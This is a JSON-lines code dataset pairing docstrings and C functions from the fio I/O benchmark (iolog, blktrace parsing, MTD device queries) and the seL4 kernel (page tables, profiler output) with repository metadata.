{"docstring": "/*\n * Read up to 255 characters from the first line of a file. Strip the trailing\n * newline.\n */\n", "func_signal": "static char *read_file(const char *path)", "code": "{\n\tchar line[256], *p = line;\n\tFILE *f;\n\n\tf = fopen(path, \"rb\");\n\tif (!f)\n\t\treturn NULL;\n\tif (!fgets(line, sizeof(line), f))\n\t\tline[0] = '\\0';\n\tstrsep(&p, \"\\n\");\n\tfclose(f);\n\n\treturn strdup(line);\n}", "path": "fio/oslib/linux-blkzoned.c", "commit_date": "2020-09-01 00:00:00", "repo_name": "axboe/fio", "stars": 4773, "license": "gpl-2.0", "language": "c", "size": 30028}
{"docstring": "/*\n * log a successful write, so we can unwind the log for verify\n */\n", "func_signal": "void log_io_piece(struct thread_data *td, struct io_u *io_u)", "code": "{\n\tstruct fio_rb_node **p, *parent;\n\tstruct io_piece *ipo, *__ipo;\n\n\tipo = calloc(1, sizeof(struct io_piece));\n\tinit_ipo(ipo);\n\tipo->file = io_u->file;\n\tipo->offset = io_u->offset;\n\tipo->len = io_u->buflen;\n\tipo->numberio = io_u->numberio;\n\tipo->flags = IP_F_IN_FLIGHT;\n\n\tio_u->ipo = ipo;\n\n\tif (io_u_should_trim(td, io_u)) {\n\t\tflist_add_tail(&ipo->trim_list, &td->trim_list);\n\t\ttd->trim_entries++;\n\t}\n\n\t/*\n\t * Only sort writes if we don't have a random map in which case we need\n\t * to check for duplicate blocks and drop the old one, which we rely on\n\t * the rb insert/lookup for handling.\n\t */\n\tif (file_randommap(td, ipo->file)) {\n\t\tINIT_FLIST_HEAD(&ipo->list);\n\t\tflist_add_tail(&ipo->list, &td->io_hist_list);\n\t\tipo->flags |= IP_F_ONLIST;\n\t\ttd->io_hist_len++;\n\t\treturn;\n\t}\n\n\tRB_CLEAR_NODE(&ipo->rb_node);\n\n\t/*\n\t * Sort the entry into the verification list\n\t */\nrestart:\n\tp = &td->io_hist_tree.rb_node;\n\tparent = NULL;\n\twhile (*p) {\n\t\tint overlap = 0;\n\t\tparent = *p;\n\n\t\t__ipo = rb_entry(parent, struct io_piece, rb_node);\n\t\tif (ipo->file < __ipo->file)\n\t\t\tp = &(*p)->rb_left;\n\t\telse if (ipo->file > __ipo->file)\n\t\t\tp = &(*p)->rb_right;\n\t\telse if (ipo->offset < __ipo->offset) {\n\t\t\tp = &(*p)->rb_left;\n\t\t\toverlap = ipo->offset + ipo->len > __ipo->offset;\n\t\t}\n\t\telse if (ipo->offset > __ipo->offset) {\n\t\t\tp = &(*p)->rb_right;\n\t\t\toverlap = __ipo->offset + __ipo->len > ipo->offset;\n\t\t}\n\t\telse\n\t\t\toverlap = 1;\n\n\t\tif (overlap) {\n\t\t\tdprint(FD_IO, \"iolog: overlap %llu/%lu, %llu/%lu\\n\",\n\t\t\t\t__ipo->offset, __ipo->len,\n\t\t\t\tipo->offset, ipo->len);\n\t\t\ttd->io_hist_len--;\n\t\t\trb_erase(parent, &td->io_hist_tree);\n\t\t\tremove_trim_entry(td, __ipo);\n\t\t\tif (!(__ipo->flags & IP_F_IN_FLIGHT))\n\t\t\t\tfree(__ipo);\n\t\t\tgoto restart;\n\t\t}\n\t}\n\n\trb_link_node(&ipo->rb_node, parent, p);\n\trb_insert_color(&ipo->rb_node, &td->io_hist_tree);\n\tipo->flags |= IP_F_ONRB;\n\ttd->io_hist_len++;\n}", "path": "fio/iolog.c", "commit_date": "2020-08-11 00:00:00", "repo_name": "axboe/fio", "stars": 4773, "license": "gpl-2.0", "language": "c", "size": 30028}
{"docstring": "/*\n * Set up a log for storing io patterns.\n */\n", "func_signal": "static bool init_iolog_write(struct thread_data *td)", "code": "{\n\tstruct fio_file *ff;\n\tFILE *f;\n\tunsigned int i;\n\n\tf = fopen(td->o.write_iolog_file, \"a\");\n\tif (!f) {\n\t\tperror(\"fopen write iolog\");\n\t\treturn false;\n\t}\n\n\t/*\n\t * That's it for writing, setup a log buffer and we're done.\n\t  */\n\ttd->iolog_f = f;\n\ttd->iolog_buf = malloc(8192);\n\tsetvbuf(f, td->iolog_buf, _IOFBF, 8192);\n\n\t/*\n\t * write our version line\n\t */\n\tif (fprintf(f, \"%s\\n\", iolog_ver2) < 0) {\n\t\tperror(\"iolog init\\n\");\n\t\treturn false;\n\t}\n\n\t/*\n\t * add all known files\n\t */\n\tfor_each_file(td, ff, i)\n\t\tlog_file(td, ff, FIO_LOG_ADD_FILE);\n\n\treturn true;\n}", "path": "fio/iolog.c", "commit_date": "2020-08-11 00:00:00", "repo_name": "axboe/fio", "stars": 4773, "license": "gpl-2.0", "language": "c", "size": 30028}
{"docstring": "/* Load all dynamic engines in FIO_EXT_ENG_DIR for enghelp command */\n", "func_signal": "static void\nfio_load_dynamic_engines(struct thread_data *td)", "code": "{\n\tDIR *dirhandle = NULL;\n\tstruct dirent *dirent = NULL;\n\tchar engine_path[PATH_MAX];\n\n\tdirhandle = opendir(FIO_EXT_ENG_DIR);\n\tif (!dirhandle)\n\t\treturn;\n\n\twhile ((dirent = readdir(dirhandle)) != NULL) {\n\t\tif (!strcmp(dirent->d_name, \".\") ||\n\t\t    !strcmp(dirent->d_name, \"..\"))\n\t\t\tcontinue;\n\n\t\tsprintf(engine_path, \"%s/%s\", FIO_EXT_ENG_DIR, dirent->d_name);\n\t\tdlopen_ioengine(td, engine_path);\n\t}\n\n\tclosedir(dirhandle);\n}", "path": "fio/ioengines.c", "commit_date": "2020-11-09 00:00:00", "repo_name": "axboe/fio", "stars": 4773, "license": "gpl-2.0", "language": "c", "size": 30028}
{"docstring": "/*\n * Just discard the pdu by seeking past it.\n */\n", "func_signal": "static int discard_pdu(struct fifo *fifo, int fd, struct blk_io_trace *t)", "code": "{\n\tif (t->pdu_len == 0)\n\t\treturn 0;\n\n\treturn trace_fifo_get(fifo, fd, NULL, t->pdu_len);\n}", "path": "fio/t/btrace2fio.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "axboe/fio", "stars": 4773, "license": "gpl-2.0", "language": "c", "size": 30028}
{"docstring": "/*\n * Retrieve 'len' bytes from the fifo, refilling if necessary.\n */\n", "func_signal": "static int trace_fifo_get(struct fifo *fifo, int fd, void *buf,\n\t\t\t  unsigned int len)", "code": "{\n\tif (fifo_len(fifo) < len) {\n\t\tint ret = refill_fifo(fifo, fd);\n\n\t\tif (ret < 0)\n\t\t\treturn ret;\n\t}\n\n\treturn fifo_get(fifo, buf, len);\n}", "path": "fio/t/btrace2fio.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "axboe/fio", "stars": 4773, "license": "gpl-2.0", "language": "c", "size": 30028}
{"docstring": "/* calculate mean and standard deviation to complete an unit of work */\n", "func_signal": "static void calibration_stats(void)", "code": "{\n\tint i;\n\tdouble sum = 0.0, var = 0.0;\n\tstruct idle_prof_thread *ipt;\n\n\tfor (i = 0; i < ipc.nr_cpus; i++) {\n\t\tipt = &ipc.ipts[i];\n\t\tsum += ipt->cali_time;\n\t}\n\n\tipc.cali_mean = sum/ipc.nr_cpus;\n\n\tfor (i = 0; i < ipc.nr_cpus; i++) {\n\t\tipt = &ipc.ipts[i];\n\t\tvar += pow(ipt->cali_time-ipc.cali_mean, 2);\n\t}\n\n\tipc.cali_stddev = sqrt(var/(ipc.nr_cpus-1));\n}", "path": "fio/idletime.c", "commit_date": "2020-01-02 00:00:00", "repo_name": "axboe/fio", "stars": 4773, "license": "gpl-2.0", "language": "c", "size": 30028}
{"docstring": "/*\n * Load a blktrace file by reading all the blk_io_trace entries, and storing\n * them as io_pieces like the fio text version would do.\n */\n", "func_signal": "static int load_blktrace(const char *fname, int need_swap)", "code": "{\n\tstruct btrace_pid *p;\n\tunsigned long traces;\n\tstruct blk_io_trace t;\n\tstruct fifo *fifo;\n\tint fd, ret = 0;\n\n\tfd = open(fname, O_RDONLY);\n\tif (fd < 0) {\n\t\tperror(\"open trace file\\n\");\n\t\treturn 1;\n\t}\n\n\tfifo = fifo_alloc(TRACE_FIFO_SIZE);\n\n\ttraces = 0;\n\tdo {\n\t\tret = trace_fifo_get(fifo, fd, &t, sizeof(t));\n\t\tif (ret < 0)\n\t\t\tgoto err;\n\t\telse if (!ret)\n\t\t\tbreak;\n\t\telse if (ret < (int) sizeof(t)) {\n\t\t\tlog_err(\"fio: short fifo get\\n\");\n\t\t\tbreak;\n\t\t}\n\n\t\tif (need_swap)\n\t\t\tbyteswap_trace(&t);\n\n\t\tif ((t.magic & 0xffffff00) != BLK_IO_TRACE_MAGIC) {\n\t\t\tlog_err(\"fio: bad magic in blktrace data: %x\\n\", t.magic);\n\t\t\tgoto err;\n\t\t}\n\t\tif ((t.magic & 0xff) != BLK_IO_TRACE_VERSION) {\n\t\t\tlog_err(\"fio: bad blktrace version %d\\n\", t.magic & 0xff);\n\t\t\tgoto err;\n\t\t}\n\t\tret = discard_pdu(fifo, fd, &t);\n\t\tif (ret < 0) {\n\t\t\tlog_err(\"blktrace lseek\\n\");\n\t\t\tgoto err;\n\t\t} else if (t.pdu_len != ret) {\n\t\t\tlog_err(\"fio: discarded %d of %d\\n\", ret, t.pdu_len);\n\t\t\tgoto err;\n\t\t}\n\n\t\tp = pid_hash_get(t.pid);\n\t\tret = handle_trace(&t, p);\n\t\tif (ret)\n\t\t\tbreak;\n\t\tp->o.last_ttime[t_to_rwdir(&t)] = t.time;\n\t\ttraces++;\n\t} while (1);\n\n\tfifo_free(fifo);\n\tclose(fd);\n\n\tif (ret)\n\t\treturn ret;\n\n\tif (output_ascii)\n\t\tprintf(\"Traces loaded: %lu\\n\", traces);\n\n\treturn 0;\nerr:\n\tclose(fd);\n\tfifo_free(fifo);\n\treturn 1;\n}", "path": "fio/t/btrace2fio.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "axboe/fio", "stars": 4773, "license": "gpl-2.0", "language": "c", "size": 30028}
{"docstring": "/*\n * Get time to complete an unit work on a particular cpu.\n * The minimum number in CALIBRATE_RUNS runs is returned.\n */\n", "func_signal": "static double calibrate_unit(unsigned char *data)", "code": "{\n\tunsigned long t, i, j, k;\n\tstruct timespec tps;\n\tdouble tunit = 0.0;\n\n\tfor (i = 0; i < CALIBRATE_RUNS; i++) {\n\n\t\tfio_gettime(&tps, NULL);\n\t\t/* scale for less variance */\n\t\tfor (j = 0; j < CALIBRATE_SCALE; j++) {\n\t\t\t/* unit of work */\n\t\t\tfor (k=0; k < page_size; k++) {\n\t\t\t\tdata[(k + j) % page_size] = k % 256;\n\t\t\t\t/*\n\t\t\t\t * we won't see STOP here. this is to match\n\t\t\t\t * the same statement in the profiling loop.\n\t\t\t\t */\n\t\t\t\tif (ipc.status == IDLE_PROF_STATUS_PROF_STOP)\n\t\t\t\t\treturn 0.0;\n\t\t\t}\n\t\t}\n\n\t\tt = utime_since_now(&tps);\n\t\tif (!t)\n\t\t\tcontinue;\n\n\t\t/* get the minimum time to complete CALIBRATE_SCALE units */\n\t\tif ((i == 0) || ((double)t < tunit))\n\t\t\ttunit = (double)t;\n\t}\n\n\treturn tunit / CALIBRATE_SCALE;\n}", "path": "fio/idletime.c", "commit_date": "2020-01-02 00:00:00", "repo_name": "axboe/fio", "stars": 4773, "license": "gpl-2.0", "language": "c", "size": 30028}
{"docstring": "/**\n * legacy_get_dev_info1 - legacy version of 'mtd_get_dev_info1()'.\n * @node: name of the MTD device node\n * @mtd: the MTD device information is returned here\n *\n * This function is similar to 'mtd_get_dev_info1()' and has the same\n * conventions.\n */\n", "func_signal": "int legacy_get_dev_info1(int mtd_num, struct mtd_dev_info *mtd)", "code": "{\n\tchar node[sizeof(MTD_DEV_PATT) + 20];\n\n\tsprintf(node, MTD_DEV_PATT, mtd_num);\n\treturn legacy_get_dev_info(node, mtd);\n}", "path": "fio/oslib/libmtd_legacy.c", "commit_date": "2017-10-29 00:00:00", "repo_name": "axboe/fio", "stars": 4773, "license": "gpl-2.0", "language": "c", "size": 30028}
{"docstring": "/*\n * Iterative chunk inflation. Handles cases where we cross into a new\n * sequence, doing flush finish of previous chunk if needed.\n */\n", "func_signal": "static size_t inflate_chunk(struct iolog_compress *ic, int gz_hdr, FILE *f,\n\t\t\t    z_stream *stream, struct inflate_chunk_iter *iter)", "code": "{\n\tsize_t ret;\n\n\tdprint(FD_COMPRESS, \"inflate chunk size=%lu, seq=%u\\n\",\n\t\t\t\t(unsigned long) ic->len, ic->seq);\n\n\tif (ic->seq != iter->seq) {\n\t\tif (iter->seq)\n\t\t\tfinish_chunk(stream, f, iter);\n\n\t\tz_stream_init(stream, gz_hdr);\n\t\titer->seq = ic->seq;\n\t}\n\n\tstream->avail_in = ic->len;\n\tstream->next_in = ic->buf;\n\n\tif (!iter->buf_size) {\n\t\titer->buf_size = iter->chunk_sz;\n\t\titer->buf = malloc(iter->buf_size);\n\t}\n\n\twhile (stream->avail_in) {\n\t\tsize_t this_out = iter->buf_size - iter->buf_used;\n\t\tint err;\n\n\t\tstream->avail_out = this_out;\n\t\tstream->next_out = iter->buf + iter->buf_used;\n\n\t\terr = inflate(stream, Z_NO_FLUSH);\n\t\tif (err < 0) {\n\t\t\tlog_err(\"fio: failed inflating log: %d\\n\", err);\n\t\t\titer->err = err;\n\t\t\tbreak;\n\t\t}\n\n\t\titer->buf_used += this_out - stream->avail_out;\n\n\t\tif (!stream->avail_out) {\n\t\t\titer->buf_size += iter->chunk_sz;\n\t\t\titer->buf = realloc(iter->buf, iter->buf_size);\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (err == Z_STREAM_END)\n\t\t\tbreak;\n\t}\n\n\tret = (void *) stream->next_in - ic->buf;\n\n\tdprint(FD_COMPRESS, \"inflated to size=%lu\\n\", (unsigned long) iter->buf_size);\n\n\treturn ret;\n}", "path": "fio/iolog.c", "commit_date": "2020-08-11 00:00:00", "repo_name": "axboe/fio", "stars": 4773, "license": "gpl-2.0", "language": "c", "size": 30028}
{"docstring": "/*\n * fifo refill frontend, to avoid reading data in trace sized bites\n */\n", "func_signal": "static int refill_fifo(struct fifo *fifo, int fd)", "code": "{\n\tchar buf[TRACE_FIFO_SIZE];\n\tunsigned int total;\n\tint ret;\n\n\ttotal = sizeof(buf);\n\tif (total > fifo_room(fifo))\n\t\ttotal = fifo_room(fifo);\n\n\tret = read(fd, buf, total);\n\tif (ret < 0) {\n\t\tperror(\"read refill\");\n\t\treturn -1;\n\t}\n\n\tif (ret > 0)\n\t\tret = fifo_put(fifo, buf, ret);\n\n\treturn ret;\n}", "path": "fio/t/btrace2fio.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "axboe/fio", "stars": 4773, "license": "gpl-2.0", "language": "c", "size": 30028}
{"docstring": "/*\n * Queue work item to compress the existing log entries. We reset the\n * current log to a small size, and reference the existing log in the\n * data that we queue for compression. Once compression has been done,\n * this old log is freed. If called with finish == true, will not return\n * until the log compression has completed, and will flush all previous\n * logs too\n */\n", "func_signal": "static int iolog_flush(struct io_log *log)", "code": "{\n\tstruct iolog_flush_data *data;\n\n\tdata = malloc(sizeof(*data));\n\tif (!data)\n\t\treturn 1;\n\n\tdata->log = log;\n\tdata->free = false;\n\n\twhile (!flist_empty(&log->io_logs)) {\n\t\tstruct io_logs *cur_log;\n\n\t\tcur_log = flist_first_entry(&log->io_logs, struct io_logs, list);\n\t\tflist_del_init(&cur_log->list);\n\n\t\tdata->samples = cur_log->log;\n\t\tdata->nr_samples = cur_log->nr_samples;\n\n\t\tsfree(cur_log);\n\n\t\tgz_work(data);\n\t}\n\n\tfree(data);\n\treturn 0;\n}", "path": "fio/iolog.c", "commit_date": "2020-08-11 00:00:00", "repo_name": "axboe/fio", "stars": 4773, "license": "gpl-2.0", "language": "c", "size": 30028}
{"docstring": "/**\n * legacy_mtd_get_info - legacy version of 'mtd_get_info()'.\n * @info: the MTD device information is returned here\n *\n * This function is similar to 'mtd_get_info()' and has the same conventions.\n */\n", "func_signal": "int legacy_mtd_get_info(struct mtd_info *info)", "code": "{\n\tint ret;\n\tstruct proc_parse_info pi;\n\n\tret = proc_parse_start(&pi);\n\tif (ret)\n\t\treturn -1;\n\n\tinfo->lowest_mtd_num = INT_MAX;\n\twhile (proc_parse_next(&pi)) {\n\t\tinfo->mtd_dev_cnt += 1;\n\t\tif (pi.mtd_num > info->highest_mtd_num)\n\t\t\tinfo->highest_mtd_num = pi.mtd_num;\n\t\tif (pi.mtd_num < info->lowest_mtd_num)\n\t\t\tinfo->lowest_mtd_num = pi.mtd_num;\n\t}\n\n\treturn 0;\n}", "path": "fio/oslib/libmtd_legacy.c", "commit_date": "2017-10-29 00:00:00", "repo_name": "axboe/fio", "stars": 4773, "license": "gpl-2.0", "language": "c", "size": 30028}
{"docstring": "/*\n * For cleaning up an ioengine which never made it to init().\n */\n", "func_signal": "void free_ioengine(struct thread_data *td)", "code": "{\n\tdprint(FD_IO, \"free ioengine %s\\n\", td->io_ops->name);\n\n\tif (td->eo && td->io_ops->options) {\n\t\toptions_free(td->io_ops->options, td->eo);\n\t\tfree(td->eo);\n\t\ttd->eo = NULL;\n\t}\n\n\tif (td->io_ops_dlhandle) {\n\t\tdlclose(td->io_ops_dlhandle);\n\t\ttd->io_ops_dlhandle = NULL;\n\t}\n\n\ttd->io_ops = NULL;\n}", "path": "fio/ioengines.c", "commit_date": "2020-11-09 00:00:00", "repo_name": "axboe/fio", "stars": 4773, "license": "gpl-2.0", "language": "c", "size": 30028}
{"docstring": "/*\n * Open compressed log file and decompress the stored chunks and\n * write them to stdout. The chunks are stored sequentially in the\n * file, so we iterate over them and do them one-by-one.\n */\n", "func_signal": "int iolog_file_inflate(const char *file)", "code": "{\n\tstruct inflate_chunk_iter iter = { .chunk_sz = 64 * 1024 * 1024, };\n\tstruct iolog_compress ic;\n\tz_stream stream;\n\tstruct stat sb;\n\tsize_t ret;\n\tsize_t total;\n\tvoid *buf;\n\tFILE *f;\n\n\tf = fopen(file, \"r\");\n\tif (!f) {\n\t\tperror(\"fopen\");\n\t\treturn 1;\n\t}\n\n\tif (stat(file, &sb) < 0) {\n\t\tfclose(f);\n\t\tperror(\"stat\");\n\t\treturn 1;\n\t}\n\n\tic.buf = buf = malloc(sb.st_size);\n\tic.len = sb.st_size;\n\tic.seq = 1;\n\n\tret = fread(ic.buf, ic.len, 1, f);\n\tif (ret == 0 && ferror(f)) {\n\t\tperror(\"fread\");\n\t\tfclose(f);\n\t\tfree(buf);\n\t\treturn 1;\n\t} else if (ferror(f) || (!feof(f) && ret != 1)) {\n\t\tlog_err(\"fio: short read on reading log\\n\");\n\t\tfclose(f);\n\t\tfree(buf);\n\t\treturn 1;\n\t}\n\n\tfclose(f);\n\n\t/*\n\t * Each chunk will return Z_STREAM_END. We don't know how many\n\t * chunks are in the file, so we just keep looping and incrementing\n\t * the sequence number until we have consumed the whole compressed\n\t * file.\n\t */\n\ttotal = ic.len;\n\tdo {\n\t\tsize_t iret;\n\n\t\tiret = inflate_chunk(&ic,  1, stdout, &stream, &iter);\n\t\ttotal -= iret;\n\t\tif (!total)\n\t\t\tbreak;\n\t\tif (iter.err)\n\t\t\tbreak;\n\n\t\tic.seq++;\n\t\tic.len -= iret;\n\t\tic.buf += iret;\n\t} while (1);\n\n\tif (iter.seq) {\n\t\tfinish_chunk(&stream, stdout, &iter);\n\t\tfree(iter.buf);\n\t}\n\n\tfree(buf);\n\treturn iter.err;\n}", "path": "fio/iolog.c", "commit_date": "2020-08-11 00:00:00", "repo_name": "axboe/fio", "stars": 4773, "license": "gpl-2.0", "language": "c", "size": 30028}
{"docstring": "/**\n * legacy_get_dev_info - legacy version of 'mtd_get_dev_info()'.\n * @node: name of the MTD device node\n * @mtd: the MTD device information is returned here\n *\n * This function is similar to 'mtd_get_dev_info()' and has the same\n * conventions.\n */\n", "func_signal": "int legacy_get_dev_info(const char *node, struct mtd_dev_info *mtd)", "code": "{\n\tstruct stat st;\n\tstruct mtd_info_user ui;\n\tint fd, ret;\n\tloff_t offs = 0;\n\tstruct proc_parse_info pi;\n\n\tif (stat(node, &st)) {\n\t\tsys_errmsg(\"cannot open \\\"%s\\\"\", node);\n\t\tif (errno == ENOENT)\n\t\t\tnormsg(\"MTD subsystem is old and does not support \"\n\t\t\t       \"sysfs, so MTD character device nodes have \"\n\t\t\t       \"to exist\");\n\t}\n\n\tif (!S_ISCHR(st.st_mode)) {\n\t\terrno = EINVAL;\n\t\treturn errmsg(\"\\\"%s\\\" is not a character device\", node);\n\t}\n\n\tmemset(mtd, '\\0', sizeof(struct mtd_dev_info));\n\tmtd->major = major(st.st_rdev);\n\tmtd->minor = minor(st.st_rdev);\n\n\tif (mtd->major != MTD_DEV_MAJOR) {\n\t\terrno = EINVAL;\n\t\treturn errmsg(\"\\\"%s\\\" has major number %d, MTD devices have \"\n\t\t\t      \"major %d\", node, mtd->major, MTD_DEV_MAJOR);\n\t}\n\n\tmtd->mtd_num = mtd->minor / 2;\n\n\tfd = open(node, O_RDONLY);\n\tif (fd == -1)\n\t\treturn sys_errmsg(\"cannot open \\\"%s\\\"\", node);\n\n\tif (ioctl(fd, MEMGETINFO, &ui)) {\n\t\tsys_errmsg(\"MEMGETINFO ioctl request failed\");\n\t\tgoto out_close;\n\t}\n\n\tret = ioctl(fd, MEMGETBADBLOCK, &offs);\n\tif (ret == -1) {\n\t\tif (errno != EOPNOTSUPP) {\n\t\t\tsys_errmsg(\"MEMGETBADBLOCK ioctl failed\");\n\t\t\tgoto out_close;\n\t\t}\n\t\terrno = 0;\n\t\tmtd->bb_allowed = 0;\n\t} else\n\t\tmtd->bb_allowed = 1;\n\n\tmtd->type = ui.type;\n\tmtd->size = ui.size;\n\tmtd->eb_size = ui.erasesize;\n\tmtd->min_io_size = ui.writesize;\n\tmtd->oob_size = ui.oobsize;\n\n\tif (mtd->min_io_size <= 0) {\n\t\terrmsg(\"mtd%d (%s) has insane min. I/O unit size %d\",\n\t\t       mtd->mtd_num, node, mtd->min_io_size);\n\t\tgoto out_close;\n\t}\n\tif (mtd->eb_size <= 0 || mtd->eb_size < mtd->min_io_size) {\n\t\terrmsg(\"mtd%d (%s) has insane eraseblock size %d\",\n\t\t       mtd->mtd_num, node, mtd->eb_size);\n\t\tgoto out_close;\n\t}\n\tif (mtd->size <= 0 || mtd->size < mtd->eb_size) {\n\t\terrmsg(\"mtd%d (%s) has insane size %lld\",\n\t\t       mtd->mtd_num, node, mtd->size);\n\t\tgoto out_close;\n\t}\n\tmtd->eb_cnt = mtd->size / mtd->eb_size;\n\n\tswitch(mtd->type) {\n\tcase MTD_ABSENT:\n\t\terrmsg(\"mtd%d (%s) is removable and is not present\",\n\t\t       mtd->mtd_num, node);\n\t\tgoto out_close;\n\tcase MTD_RAM:\n\t\tstrcpy((char *)mtd->type_str, \"ram\");\n\t\tbreak;\n\tcase MTD_ROM:\n\t\tstrcpy((char *)mtd->type_str, \"rom\");\n\t\tbreak;\n\tcase MTD_NORFLASH:\n\t\tstrcpy((char *)mtd->type_str, \"nor\");\n\t\tbreak;\n\tcase MTD_NANDFLASH:\n\t\tstrcpy((char *)mtd->type_str, \"nand\");\n\t\tbreak;\n\tcase MTD_MLCNANDFLASH:\n\t\tstrcpy((char *)mtd->type_str, \"mlc-nand\");\n\t\tbreak;\n\tcase MTD_DATAFLASH:\n\t\tstrcpy((char *)mtd->type_str, \"dataflash\");\n\t\tbreak;\n\tcase MTD_UBIVOLUME:\n\t\tstrcpy((char *)mtd->type_str, \"ubi\");\n\t\tbreak;\n\tdefault:\n\t\tgoto out_close;\n\t}\n\n\tif (ui.flags & MTD_WRITEABLE)\n\t\tmtd->writable = 1;\n\tmtd->subpage_size = mtd->min_io_size;\n\n\tclose(fd);\n\n\t/*\n\t * Unfortunately, the device name is not available via ioctl, and\n\t * we have to parse /proc/mtd to get it.\n\t */\n\tret = proc_parse_start(&pi);\n\tif (ret)\n\t\treturn -1;\n\n\twhile (proc_parse_next(&pi)) {\n\t\tif (pi.mtd_num == mtd->mtd_num) {\n\t\t\tstrcpy((char *)mtd->name, pi.name);\n\t\t\treturn 0;\n\t\t}\n\t}\n\n\terrmsg(\"mtd%d not found in \\\"%s\\\"\", mtd->mtd_num, MTD_PROC_FILE);\n\terrno = ENOENT;\n\treturn -1;\n\nout_close:\n\tclose(fd);\n\treturn -1;\n}", "path": "fio/oslib/libmtd_legacy.c", "commit_date": "2017-10-29 00:00:00", "repo_name": "axboe/fio", "stars": 4773, "license": "gpl-2.0", "language": "c", "size": 30028}
{"docstring": "/**\n * legacy_dev_presentl - legacy version of 'mtd_dev_present()'.\n * @info: the MTD device information is returned here\n *\n * When the kernel does not provide sysfs files for the MTD subsystem,\n * fall-back to parsing the /proc/mtd file to determine whether an mtd device\n * number @mtd_num is present.\n */\n", "func_signal": "int legacy_dev_present(int mtd_num)", "code": "{\n\tint ret;\n\tstruct proc_parse_info pi;\n\n\tret = proc_parse_start(&pi);\n\tif (ret)\n\t\treturn -1;\n\n\twhile (proc_parse_next(&pi)) {\n\t\tif (pi.mtd_num == mtd_num)\n\t\t\treturn 1;\n\t}\n\n\treturn 0;\n}", "path": "fio/oslib/libmtd_legacy.c", "commit_date": "2017-10-29 00:00:00", "repo_name": "axboe/fio", "stars": 4773, "license": "gpl-2.0", "language": "c", "size": 30028}
{"docstring": "/*\n * open iolog, check version, and call appropriate parser\n */\n", "func_signal": "static bool init_iolog_read(struct thread_data *td)", "code": "{\n\tchar buffer[256], *p, *fname;\n\tFILE *f = NULL;\n\n\tfname = get_name_by_idx(td->o.read_iolog_file, td->subjob_number);\n\tdprint(FD_IO, \"iolog: name=%s\\n\", fname);\n\n\tif (is_socket(fname)) {\n\t\tint fd;\n\n\t\tfd = open_socket(fname);\n\t\tif (fd >= 0)\n\t\t\tf = fdopen(fd, \"r\");\n\t} else if (!strcmp(fname, \"-\")) {\n\t\tf = stdin;\n\t} else\n\t\tf = fopen(fname, \"r\");\n\n\tfree(fname);\n\n\tif (!f) {\n\t\tperror(\"fopen read iolog\");\n\t\treturn false;\n\t}\n\n\tp = fgets(buffer, sizeof(buffer), f);\n\tif (!p) {\n\t\ttd_verror(td, errno, \"iolog read\");\n\t\tlog_err(\"fio: unable to read iolog\\n\");\n\t\tfclose(f);\n\t\treturn false;\n\t}\n\n\t/*\n\t * version 2 of the iolog stores a specific string as the\n\t * first line, check for that\n\t */\n\tif (!strncmp(iolog_ver2, buffer, strlen(iolog_ver2))) {\n\t\tfree_release_files(td);\n\t\ttd->io_log_rfile = f;\n\t\treturn read_iolog2(td);\n\t}\n\n\tlog_err(\"fio: iolog version 1 is no longer supported\\n\");\n\tfclose(f);\n\treturn false;\n}", "path": "fio/iolog.c", "commit_date": "2020-08-11 00:00:00", "repo_name": "axboe/fio", "stars": 4773, "license": "gpl-2.0", "language": "c", "size": 30028}
{"docstring": "/*\n * print object slots\n */\n", "func_signal": "static void arm64_cap_pt_print_slots(pde_t *pdSlot, vptr_t vptr)", "code": "{\n    pte_t *pt = paddr_to_pptr(pde_pde_small_ptr_get_pt_base_address(pdSlot));\n    printf(\"pt_%p_%04lu {\\n\", pdSlot, GET_PD_INDEX(vptr));\n\n    for (word_t i = 0; i < BIT(PT_INDEX_OFFSET + PT_INDEX_BITS); i += (1 << PT_INDEX_OFFSET)) {\n        pte_t *ptSlot = pt + GET_PT_INDEX(i);\n\n        if (pte_ptr_get_present(ptSlot)) {\n            // print pte entries\n            printf(\"0x%lx: frame_%p_%04lu\", GET_PT_INDEX(i), ptSlot, GET_PT_INDEX(i));\n            cap_frame_print_attrs_pt(ptSlot);\n        }\n    }\n    printf(\"}\\n\"); /* pt */\n}", "path": "seL4/src/arch/arm/64/machine/capdl.c", "commit_date": "2020-10-28 00:00:00", "repo_name": "seL4/seL4", "stars": 4474, "license": "other", "language": "c", "size": 14018}
{"docstring": "/* Create a page table for the initial thread */\n", "func_signal": "static BOOT_CODE cap_t create_it_page_table_cap(cap_t pd, pptr_t pptr, vptr_t vptr, asid_t asid)", "code": "{\n    cap_t cap;\n    cap = cap_page_table_cap_new(\n              1,    /* capPTIsMapped      */\n              asid, /* capPTMappedASID    */\n              vptr, /* capPTMappedAddress */\n              pptr  /* capPTBasePtr       */\n          );\n    if (asid != asidInvalid) {\n        map_it_pt_cap(pd, cap);\n    }\n    return cap;\n}", "path": "seL4/src/arch/arm/32/kernel/vspace.c", "commit_date": "2020-11-10 00:00:00", "repo_name": "seL4/seL4", "stars": 4474, "license": "other", "language": "c", "size": 14018}
{"docstring": "/*\n * Dump out recorded values to stdout\n */\n", "func_signal": "void profiler_list(void)", "code": "{\n    long long samples;\n\n    /* Print header */\n    printf(\"addr     count\\n\");\n\n    /* Print out each address */\n    samples = 0;\n    for (word_t i = 0; i < MAX_UNIQUE_INSTRUCTIONS; i++) {\n        if (profiler_entries[i].pc != 0) {\n            printf(\"%x %d\\n\", (unsigned int)profiler_entries[i].pc,\n                   (int)profiler_entries[i].count);\n            samples += profiler_entries[i].count;\n        }\n    }\n\n    /* Print statistics */\n    printf(\"\\n%d unique address(es), %d sample(s)\\n\",\n           (int)profiler_num_entries, (int)samples);\n    if (profiler_dropped_instructions > 0) {\n        printf(\"*** WARNING : %d instructions dropped\\n\",\n               (int)profiler_dropped_instructions);\n    }\n}", "path": "seL4/src/machine/profiler.c", "commit_date": "2020-03-09 00:00:00", "repo_name": "seL4/seL4", "stars": 4474, "license": "other", "language": "c", "size": 14018}
